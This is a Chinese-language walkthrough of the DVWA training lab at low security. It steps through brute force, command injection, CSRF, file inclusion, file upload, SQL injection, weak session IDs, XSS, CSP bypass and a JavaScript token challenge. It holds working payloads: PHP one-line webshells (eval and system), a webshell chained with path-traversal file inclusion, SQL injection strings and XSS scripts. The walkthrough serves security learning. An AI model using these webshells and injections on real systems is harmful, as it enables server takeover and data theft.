此次练习将Security Level设置为low。

<h1 id="TdocK">Brute Force</h1>
![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757555612399-922a46bd-ef5f-4e89-a6aa-827fd7b5b765.png)

直接使用Burp抓包进行爆破。双击刚刚输入的`username`和`password`并点击`Add`变成有效载荷，参数的字典是从网上随便找的，设置好后开始攻击，发现返回长度有跟大部分的不同，查看响应，爆破成功：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757558214015-ce806b1d-b420-4114-93a7-2df02dbfdab9.png)

账号是`admin`，密码是`password`：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757558289852-5d8f5543-e045-4095-bdac-c98a7b4da177.png)

<h1 id="AuZDS">Command Injection</h1>
![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757559819946-859d2138-ec6f-4d49-bcca-6eca59edb9ae.png)

输入宿主机的IP地址：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757560124446-03494631-48d4-44f2-b211-5346c3b443ca.png)

<h1 id="oavAc">CSRF</h1>
![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757560666957-e08446c9-ecf6-4c2a-a19b-056f987cfea3.png)

修改密码界面，直接抓包，发现参数直接拼接在URL中：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757560652335-c36d7b10-a9fa-4289-ac92-c97e619f19e4.png)

攻击者只需要让用户点击攻击者拼接的URL，即可达到修改密码的攻击目的。

<h1 id="QZv5T">File Inclusion</h1>
![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757561085502-7a275215-7958-4b06-a3dd-88a5e2d29004.png)

随意点击一个文件，发现文件名拼接在URL中，是可控的：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757561116702-874544f3-05b5-4d08-9744-146bbbde7aa2.png)

LFI（本地文件包含）示例：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757561886228-62891756-b032-4f03-9123-67bdded3bbe5.png)

RFI（远程文件包含）示例：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757562749533-67653cbe-b018-42aa-9f0c-c5ddbb5d8010.png)

> 这里感觉文件包含和SSRF有点像，区别在于文件包含漏洞是通过控制文件路径来让应用程序执行未授权的文件，攻击者通常通过本地文件或远程文件来进行攻击。SSRF是通过伪造HTTP请求，让服务器访问本不该访问的 外部或内部资源，特别是在内网环境中，攻击者可以利用该漏洞获取敏感信息或执行恶意操作。
>

<h1 id="paduc">File Upload</h1>
![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757562177204-b3aeb63e-c450-4225-9b0d-5db90ae88be2.png)

写个一句话木马`<?php eval($_POST['ant']); ?>`上传上去：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757563028121-c02aba71-0829-41a7-a308-f659c8f92bad.png)

<font style="color:rgb(77, 77, 77);">打开webshell管理工具进行连接：</font>

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757563130272-747b07da-c355-4709-ab86-737b2c87431f.png)

连接成功，进入服务器：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757563226448-2765ec33-1815-4b2d-a7fa-ed261fe69e44.png)

> 文件上传漏洞可以和文件包含漏洞进行组合拳：
>
> + 先上传一个简单的webshell：`<?php system($_GET['cmd']); ?>`，返回上传路径是`../../hackable/upload/shell.php`
> + 然后通过文件包含漏洞访问这个文件：`?page=../../hackable/upload/shell.php`
> + 成功执行`shell.php`之后就可以通过`cmd`参数执行命令，比如：`/hackable/upload/shell.php?cmd=whoami`
>

<h1 id="CGeZB">SQL Injection</h1>
![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757571104774-b30b6ce7-2fde-4fc4-9c87-64fd10055de0.png)

输入`1`试试：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757571134460-31fe832f-1250-42e6-95d7-981d02be527c.png)

输入`1'`：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757571177682-6ad3c879-c821-4942-a1ae-c572a3bc77d6.png)

存在SQL注入漏洞。输入`1' or '1'='1`：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757571334649-c0a63592-3327-4d9f-acdd-db1d2b05fc9f.png)

可以随便注：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757571586843-b5c49a72-c3ea-44f9-a46b-8677f51b82d0.png)

<h1 id="Aimwl">SQL Injection (Blind)</h1>
![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757571638942-50b8927c-e640-4a35-805e-c2b9057c6dc8.png)

题目提示是盲注。输入`1`：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757571769799-689ba907-d4fe-4237-b291-8ee0ab743d73.png)

输入`1'`：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757571785439-e0c23865-43ca-4c92-8001-929954b0b401.png)

发现只有两种显示，通过布尔注入获取数据库信息，输入`1' and SUBSTR(database(),1,4)='dvwa'#`：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757572556719-d196ea2e-4b55-497a-9e2b-a1192567133c.png)

所以数据库库名是`dvwa`。

<h1 id="C2obp">Weak Session IDs</h1>
![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757572716844-17b479fa-f0d5-4995-9851-1659e672fa07.png)

点击生成后抓包查看cookie：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757574087234-8808f1c4-75c4-4584-9b19-2e6c13ffbc5d.png)

再点击一次抓包，发现`dvwaSession`变成5，每次加一。清空浏览器的网站数据，访问同一个URL，抓包修改Cookie，并将`dvwaSession`设置成6，可以直接登录：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757574921230-869f081d-6b22-423e-830b-3c6f34c67644.png)

<h1 id="jJx2t">XSS（DOM）</h1>
![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757575532535-7b75a2ab-eefd-494d-80ef-36f698260f79.png)

在URL中拼接一段XSS注入语句`?default=<script>alert('114514')</script>`：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757575674280-6bb77739-4bb6-4030-84ca-9e2f28fefb84.png)

<h1 id="hQMOp">XSS（Reflected）</h1>
![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757575772922-5cb8c5f2-a942-438e-9df4-0857911bffaf.png)

输入点数据看看：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757575865598-bbdb3239-a82e-42c2-97a8-cf6a5f86a81a.png)

输入一段XSS注入语句`<script>alert('114514')</script>`：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757576070880-4810e546-58b7-47e2-a69e-8c89f9d36d3f.png)

> 这里感觉DOM型和反射型又有点像，区别在于DOM型是一种客户端的攻击，发生在浏览器端，而非服务器端，通过操作URL中的参数来进行攻击；反射型发生在服务器端处理请求时，依赖于用户点击恶意链接或提交恶意表单。
>

<h1 id="D6ppP">XSS（Stored）</h1>
输入点测试数据：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757576413972-26ca8bfa-4d41-4636-9a67-a7fa465d119e.png)

开始在Message中插入XSS攻击语句后提交：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757576482419-2b056a2c-23ff-4f67-a7e7-fe363a3ece6b.png)

每次进入这个页面都会有提示：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757576513351-d091d189-7c4e-4a18-8965-b0b2a57b54de.png)

<h1 id="KH7Mh">CSP Bypass</h1>
> CSP Bypass漏洞是指绕过Web应用程序所设置的内容安全策略（CSP），从而允许攻击者执行恶意脚本或加载不信任的资源。通过CSP，网站可以指定哪些外部资源（如JavaScript 文件、CSS 样式表、图片等）是允许加载和执行的。  
>

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757577074358-5a999d1b-e5bc-41cf-8cf9-361da8703d6e.png)

查看一下源码，发现了允许加载哪些域名的资源：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757577236569-81f46483-cba5-405b-8338-a5ccece83091.png)

打开其中的[https://pastebin.com/](https://pastebin.com/)，发现是一个分享便签的网站，内容是我们可控的，写一段XSS攻击生成便签：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757577486848-bb6b67a8-afdd-479a-8d93-4e150dcbb147.png)

点击`raw`，把URL粘到靶场的输入框中提交。

<h1 id="O4LZ4">JavaScript</h1>
按要求输入`success`显示`Invalid token`：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757580408945-2cd13e4f-b434-4187-9ebf-6b6fd5806d9f.png)

查看源码，发现有一些加密的算法：

```php
<?php
$page[ 'body' ] .= <<<EOF
<script>

/*
MD5 code from here
https://github.com/blueimp/JavaScript-MD5
*/

!function(n){"use strict";function t(n,t){var r=(65535&n)+(65535&t);return(n>>16)+(t>>16)+(r>>16)<<16|65535&r}function r(n,t){return n<<t|n>>>32-t}function e(n,e,o,u,c,f){return t(r(t(t(e,n),t(u,f)),c),o)}function o(n,t,r,o,u,c,f){return e(t&r|~t&o,n,t,u,c,f)}function u(n,t,r,o,u,c,f){return e(t&o|r&~o,n,t,u,c,f)}function c(n,t,r,o,u,c,f){return e(t^r^o,n,t,u,c,f)}function f(n,t,r,o,u,c,f){return e(r^(t|~o),n,t,u,c,f)}function i(n,r){n[r>>5]|=128<<r%32,n[14+(r+64>>>9<<4)]=r;var e,i,a,d,h,l=1732584193,g=-271733879,v=-1732584194,m=271733878;for(e=0;e<n.length;e+=16)i=l,a=g,d=v,h=m,g=f(g=f(g=f(g=f(g=c(g=c(g=c(g=c(g=u(g=u(g=u(g=u(g=o(g=o(g=o(g=o(g,v=o(v,m=o(m,l=o(l,g,v,m,n[e],7,-680876936),g,v,n[e+1],12,-389564586),l,g,n[e+2],17,606105819),m,l,n[e+3],22,-1044525330),v=o(v,m=o(m,l=o(l,g,v,m,n[e+4],7,-176418897),g,v,n[e+5],12,1200080426),l,g,n[e+6],17,-1473231341),m,l,n[e+7],22,-45705983),v=o(v,m=o(m,l=o(l,g,v,m,n[e+8],7,1770035416),g,v,n[e+9],12,-1958414417),l,g,n[e+10],17,-42063),m,l,n[e+11],22,-1990404162),v=o(v,m=o(m,l=o(l,g,v,m,n[e+12],7,1804603682),g,v,n[e+13],12,-40341101),l,g,n[e+14],17,-1502002290),m,l,n[e+15],22,1236535329),v=u(v,m=u(m,l=u(l,g,v,m,n[e+1],5,-165796510),g,v,n[e+6],9,-1069501632),l,g,n[e+11],14,643717713),m,l,n[e],20,-373897302),v=u(v,m=u(m,l=u(l,g,v,m,n[e+5],5,-701558691),g,v,n[e+10],9,38016083),l,g,n[e+15],14,-660478335),m,l,n[e+4],20,-405537848),v=u(v,m=u(m,l=u(l,g,v,m,n[e+9],5,568446438),g,v,n[e+14],9,-1019803690),l,g,n[e+3],14,-187363961),m,l,n[e+8],20,1163531501),v=u(v,m=u(m,l=u(l,g,v,m,n[e+13],5,-1444681467),g,v,n[e+2],9,-51403784),l,g,n[e+7],14,1735328473),m,l,n[e+12],20,-1926607734),v=c(v,m=c(m,l=c(l,g,v,m,n[e+5],4,-378558),g,v,n[e+8],11,-2022574463),l,g,n[e+11],16,1839030562),m,l,n[e+14],23,-35309556),v=c(v,m=c(m,l=c(l,g,v,m,n[e+1],4,-1530992060),g,v,n[e+4],11,1272893353),l,g,n[e+7],16,-155497632),m,l,n[e+10],23,-1094730640),v=c(v,m=c(m,l=c(l,g,v,m,n[e+13],4,681279174),g,v,n[e],11,-358537222),l,g,n[e+3],16,-722521979),m,l,n[e+6],23,76029189),v=c(v,m=c(m,l=c(l,g,v,m,n[e+9],4,-640364487),g,v,n[e+12],11,-421815835),l,g,n[e+15],16,530742520),m,l,n[e+2],23,-995338651),v=f(v,m=f(m,l=f(l,g,v,m,n[e],6,-198630844),g,v,n[e+7],10,1126891415),l,g,n[e+14],15,-1416354905),m,l,n[e+5],21,-57434055),v=f(v,m=f(m,l=f(l,g,v,m,n[e+12],6,1700485571),g,v,n[e+3],10,-1894986606),l,g,n[e+10],15,-1051523),m,l,n[e+1],21,-2054922799),v=f(v,m=f(m,l=f(l,g,v,m,n[e+8],6,1873313359),g,v,n[e+15],10,-30611744),l,g,n[e+6],15,-1560198380),m,l,n[e+13],21,1309151649),v=f(v,m=f(m,l=f(l,g,v,m,n[e+4],6,-145523070),g,v,n[e+11],10,-1120210379),l,g,n[e+2],15,718787259),m,l,n[e+9],21,-343485551),l=t(l,i),g=t(g,a),v=t(v,d),m=t(m,h);return[l,g,v,m]}function a(n){var t,r="",e=32*n.length;for(t=0;t<e;t+=8)r+=String.fromCharCode(n[t>>5]>>>t%32&255);return r}function d(n){var t,r=[];for(r[(n.length>>2)-1]=void 0,t=0;t<r.length;t+=1)r[t]=0;var e=8*n.length;for(t=0;t<e;t+=8)r[t>>5]|=(255&n.charCodeAt(t/8))<<t%32;return r}function h(n){return a(i(d(n),8*n.length))}function l(n,t){var r,e,o=d(n),u=[],c=[];for(u[15]=c[15]=void 0,o.length>16&&(o=i(o,8*n.length)),r=0;r<16;r+=1)u[r]=909522486^o[r],c[r]=1549556828^o[r];return e=i(u.concat(d(t)),512+8*t.length),a(i(c.concat(e),640))}function g(n){var t,r,e="";for(r=0;r<n.length;r+=1)t=n.charCodeAt(r),e+="0123456789abcdef".charAt(t>>>4&15)+"0123456789abcdef".charAt(15&t);return e}function v(n){return unescape(encodeURIComponent(n))}function m(n){return h(v(n))}function p(n){return g(m(n))}function s(n,t){return l(v(n),v(t))}function C(n,t){return g(s(n,t))}function A(n,t,r){return t?r?s(t,n):C(t,n):r?m(n):p(n)}"function"==typeof define&&define.amd?define(function(){return A}):"object"==typeof module&&module.exports?module.exports=A:n.md5=A}(this);

  function rot13(inp) {
    return inp.replace(/[a-zA-Z]/g,function(c){return String.fromCharCode((c<="Z"?90:122)>=(c=c.charCodeAt(0)+13)?c:c-26);});
  }

  function generate_token() {
    var phrase = document.getElementById("phrase").value;
    document.getElementById("token").value = md5(rot13(phrase));
  }

  generate_token();
</script>
EOF;
?>
```

`!function(n)`这段代码实现了MD5哈希加密算法；`rot13`是一种简单的字母替换加密方法，将字母表中的每个字母替换为它后面13个位置的字母；`generate_token`先从页面中获取ID为`phrase`的输入框的值，然后对输入值应用`rot13`转换，将转换后的字符串传递给`md5`函数进行哈希处理，最后将MD5哈希值赋值给ID为`token`的输入框。

逻辑好像没什么问题，输入`success`打下断点Debug看看：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757581182091-3eb5043c-b7be-46e7-933c-6815820058ca.png)

惊奇地发现这个`phrase`并不是输入的`success`，而是又变成`ChangeMe`：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757581231918-32c4e0d0-78c5-477c-8cbf-255d78884ad1.png)

说明不管我们输入什么，这里生成的`token`都是`ChangeMe`的`token`。确定接下来的思路是：先生成`success`的`token`，再通过抓改包修改`token`为`success`的`token`。

`success`的`token`如下：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757581713287-c8efa7b4-4c70-4e76-9bc1-78ff11b0d378.png)

抓包后修改`token`：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757581797335-c11f45fc-50b5-48f7-bbb7-f4e6134a678a.png)

成功：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757581911062-f1f7fdbc-7447-49c5-b5ec-6ae65ef50d0b.png)



